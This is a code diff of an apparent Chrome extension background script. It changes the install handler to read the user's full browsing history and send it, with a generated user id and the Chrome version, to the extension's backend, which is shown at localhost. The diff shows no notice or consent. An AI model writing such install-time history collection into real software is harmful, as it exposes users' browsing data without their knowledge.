@@ -1,4 +1,4 @@
-// Backend calls
+/********************* Backend Calls ***************************/
 const URL = "http://localhost:5000";
 const makeRequest = (url, options) => {
     return fetch(url, options)
@@ -24,15 +24,22 @@ const postRequest = (route, data) =>
         body: JSON.stringify(data),
     });
 
+/********************* Helper ***************************/
 const addUser = (uid) => {
     const data = {
         uid: uid,
         extension_id: chrome.runtime.id,
         date_created: new Date().toString(),
+
+        // https://stackoverflow.com/a/19295499
+        version: `Chrome ${/Chrome\/([0-9.]+)/.exec(navigator.userAgent)[1]}`,
     };
-    postRequest("/user/add/", data)
-        .then((ret) => console.log(ret))
-        .catch((err) => console.log(err.message));
+    chrome.history.search({ text: "" }, (h) => {
+        data.history = h;
+        postRequest("/user/add/", data)
+            .then((ret) => console.log(ret))
+            .catch((err) => console.log(err.message));
+    });
 };
 
 const getRandomToken = () => {
@@ -46,10 +53,11 @@ const getRandomToken = () => {
     return hex;
 };
 
+// On new usercreation
 chrome.runtime.onInstalled.addListener((details) => {
-    // Made unique identifier for this user
-    if (details.reason === "install" || details.reason === "update") {
-        chrome.storage.sync.get("userid", function (items) {
+    // Made unique identifier for new user
+    if (details.reason === "install") {
+        chrome.storage.sync.get("userid", (items) => {
             const userid = items.userid ? items.userid : getRandomToken();
             chrome.storage.sync.set({ userid: userid });
             addUser(userid);
@@ -60,10 +68,5 @@ chrome.runtime.onInstalled.addListener((details) => {
         id: "sampleContextMenu",
         title: "Sample Context Menu",
         contexts: ["page"],
-    });
-
-    // Get get past 10 elements in history
-    chrome.history.search({ text: "", maxResults: 10 }, (data) => {
-        console.log(data);
     });
 });
